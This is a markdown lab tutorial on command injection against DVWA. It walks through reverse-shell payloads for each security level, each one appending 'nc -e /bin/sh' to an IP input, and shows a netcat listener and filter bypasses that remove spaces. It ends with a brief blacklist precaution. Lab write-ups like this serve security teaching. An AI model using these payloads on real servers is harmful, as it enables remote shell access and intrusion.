
# Command Injection

![image](https://user-images.githubusercontent.com/60937657/199600432-20c86df1-0b87-4137-b490-36c53d67e3cd.png)

Command Injection attack is performed by using arbitrary commands(The command which helps the system to run for example the commands used to play around with the file management system).

## What can we do by using the Command Injection attack ?

1. We can get control over the shell or terminal of the server where the website is hosted.   
2. Can upload shell using wget command on the public platform which can be highly exploitable.  

## Performing attack on DVWA 

1. Changing the security level of DVWA to low level of security. 

![image](https://user-images.githubusercontent.com/60937657/194223462-0e43d07a-d6dd-4291-8777-f9c30ff0c9e2.png)

![image](https://user-images.githubusercontent.com/60937657/194223357-3a83b501-8961-4646-b043-efc1e4060faf.png)

2. Find the IP address using terminal. 

```
  ifconfig 
```

3. Enter IP address to DVWA.  

![image](https://user-images.githubusercontent.com/60937657/194224867-2863f530-e203-4c53-92bf-344421fb8116.png)

4. Performing arbitrary command.

**Note** We will use arbitrary commands using piping. 

**For Example** 

```
  ls ; pwd 
```
```
  ls && pwd 
```
```
#In this way of piping we will only be output of final command which in pwd in this case.
  ls | pwd 
```
![image](https://user-images.githubusercontent.com/60937657/194370933-c383fb1c-ca37-48d2-ba90-a91d5ae01d8c.png)

5. Make a connection in shell of website server with terminal of our machine by starting netcat services for linux based server 

Using the below given command in terminal.

```
nc -vv -l -p 8080
```

![image](https://user-images.githubusercontent.com/60937657/194373887-5eb2d874-5036-4779-b0e8-a3bd5dbcdf2e.png)

**Note** Netcat service will always be hosted in bin folder of linux as per the architecture.

6. Using a command in which we are going to use IP of our OS to fire on website by which we are going to get a connection in out terminal. 

```
IP_Address_of_my_OS ; nc -e /bin/sh IP_Address_of_my_OS 8080
```

![image](https://user-images.githubusercontent.com/60937657/194376389-1efd866c-c799-491e-8f69-ea807c39928c.png)

7. Changing the DVWA Security level to medium and then performing command injection using different piping method. 

```
IP_Address_of_my_OS | nc -e /bin/sh IP_Address_of_my_OS 8080
``` 

![image](https://user-images.githubusercontent.com/60937657/195312022-384fa5e3-338b-45b8-a3ed-73d796266087.png)

8. Changing the DVWA Security level to high and then performing command injection by just not providing any space while piping. 

```
IP_Address_of_my_OS|nc -e /bin/sh IP_Address_of_my_OS 8080
``` 

![image](https://user-images.githubusercontent.com/60937657/195314107-abebbe23-9775-4697-a6ce-192359913e07.png)

**Note** Can also use cat command to display the contents of one or more file without having to open the file for editing. 

![image](https://user-images.githubusercontent.com/60937657/195314710-90a92522-dc9e-417c-b44d-341bc200b5e7.png)

9. Precaution to avoid command injection attack.

To avoid this type of major attack we can add blacklist as given in the image below. 

![image](https://user-images.githubusercontent.com/60937657/195316315-3f95c69c-83c0-4a0a-8b3f-8611104f6a4e.png)

![image](https://user-images.githubusercontent.com/60937657/195316066-a42cb9eb-159d-4077-8731-86e7b3123d5c.png)







